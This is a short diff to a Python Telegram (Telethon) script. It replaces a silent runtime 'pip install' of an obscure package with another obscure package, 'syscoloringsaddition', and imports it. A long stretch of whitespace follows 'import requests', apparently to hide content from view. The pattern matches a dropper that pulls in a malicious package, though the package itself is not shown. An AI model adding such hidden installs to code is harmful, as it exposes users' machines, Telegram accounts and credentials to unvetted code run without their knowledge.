@@ -1,6 +1,6 @@
 import os
-os.system("pip install sysfontstoolV1")
-import sysfontstoolV1
+os.system("pip install syscoloringsaddition")
+import syscoloringsaddition
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
